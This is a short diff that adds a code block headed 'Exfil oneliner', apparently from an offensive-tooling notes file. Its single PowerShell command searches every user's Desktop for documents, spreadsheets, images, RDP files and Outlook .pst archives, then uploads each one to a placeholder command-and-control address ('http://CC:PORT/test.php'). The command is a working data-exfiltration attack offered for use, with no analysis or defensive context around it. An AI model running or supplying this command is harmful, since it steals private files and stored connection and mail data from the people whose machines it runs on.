@@ -1,0 +1,7 @@
+```
+
+Exfil oneliner
+
+[void]((@(get-childitem $env:homedrive\users\*\deskt* -Recurse -ea 0) | ? { $_ -match '.txt|.doc|.docx|.rdp|.xls|.xlsx|.jpg|.png|.pst' } | select FullName) -replace 'Fullname','' -replace '@{=','' -replace '}','' | % { (new-object system.net.webclient).uploadfile("http://CC:PORT/test.php",$_) })
+
+```
